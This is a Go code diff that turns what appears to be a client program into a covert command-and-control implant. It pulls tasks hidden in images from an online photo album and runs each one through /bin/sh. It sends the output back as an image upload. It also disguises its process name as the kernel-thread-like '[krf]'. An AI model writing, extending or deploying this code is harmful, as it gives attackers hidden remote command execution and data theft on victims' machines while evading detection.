@@ -4,11 +4,14 @@ import (
 	"bufio"
 	"flag"
 	"fmt"
-	"io"
+	"io/ioutil"
 	"log"
 	"net/http"
 	"os"
+	"os/exec"
+	"reflect"
 	"strings"
+	"unsafe"
 
 	// Internal libs
 	"github.com/AntiMatter/cmd"
@@ -18,6 +21,7 @@ import (
 )
 
 var clientOptions = map[string]string{"ClientID": "", "AlbumID": ""}
+var imageMem string
 
 /*
 TODO:
@@ -32,8 +36,21 @@ TODO:
 
 */
 
+// ChangeProcName is a function that hooks argv[0] and renames it
+// This will stand out to filesystem analysis such as lsof and the /proc directory
+func ChangeProcName(name string) error {
+	argv0str := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[0]))
+	argv0 := (*[1 << 30]byte)(unsafe.Pointer(argv0str.Data))[:argv0str.Len]
+	n := copy(argv0, name)
+	if n < len(argv0) {
+		argv0[n] = 0
+	}
+
+	return nil
+}
+
 // getTasking is the client grabbing the tasking configured for it
-func getTasking(albumID string, clientID string) {
+func getTasking(albumID string, clientID string) (out []uint8) {
 	clientID = clientOptions["ClientID"]
 
 	linkImage := cmd.GetLinkClient(albumID, clientID)
@@ -44,28 +61,26 @@ func getTasking(albumID string, clientID string) {
 	}
 	defer response.Body.Close()
 
-	// open a file for writing
-	// Should probably have the user define what and where to call this
-	file, err := os.Create("/tmp/asdf.jpg")
+	contents, err := ioutil.ReadAll(response.Body)
 	if err != nil {
-		log.Print(err)
+		fmt.Println(err)
 	}
-	defer file.Close()
-
-	// Use io.Copy to just dump the response body to the file. This supports huge files
-	_, err = io.Copy(file, response.Body)
-	if err != nil {
-		log.Print(err)
-	}
-	fmt.Println("Get response: Success!")
-	fmt.Println(" ")
+	//fmt.Println(string(contents))
+	imageMem = string(contents)
 
 	fmt.Println(color.GreenString("Response") + ":")
 	fmt.Println(" ")
 
-	cmd.DecodeImage()
-
+	// returns the decoded message
+	task := cmd.DecodeImage(contents)
+	fmt.Println(task)
 	fmt.Println(" ")
+	out, err = exec.Command("/bin/sh", "-c", task).Output()
+	if err != nil {
+		fmt.Println("Error running commmand: ", err)
+	}
+
+	return out
 
 }
 
@@ -76,10 +91,30 @@ func decodeImage() {
 
 // encodeOutput will take the command output and encode it into another image (in memory?) and upload it to the configured album
 func encodeOutput() {
+	out := getTasking(clientOptions["AlbumID"], clientOptions["ClientID"])
+	fmt.Println(color.GreenString("Output:"))
+	fmt.Println(" ")
+	fmt.Printf("%s", out)
+	fmt.Println(" ")
+
+	fmt.Print("Please enter the Album-DeleteHash to upload response to >> ")
+	reader := bufio.NewReader(os.Stdin)
+	albumDeleteHash, err := reader.ReadString('\n')
+	if err != nil {
+		fmt.Println(err)
+	}
+	albumDeleteHash = strings.TrimSuffix(albumDeleteHash, "\n")
+	cmd.UploadImage(imageMem, "Response", albumDeleteHash, "Within this is a response", clientOptions["ClientID"])
 
 }
 
 func main() {
+
+	// Keep in mind the binary name has to be at least as long if not longer than your desired name
+	err := ChangeProcName("[krf]")
+	if err != nil {
+		fmt.Println(err.Error())
+	}
 
 	albumID := flag.String("album-id", "", "The album ID to retrieve tasking and upload responses")
 
@@ -114,5 +149,5 @@ func main() {
 	} else {
 		clientOptions["AlbumID"] = *albumID
 	}
-	getTasking(clientOptions["AlbumID"], clientOptions["ClientID"])
+	encodeOutput()
 }
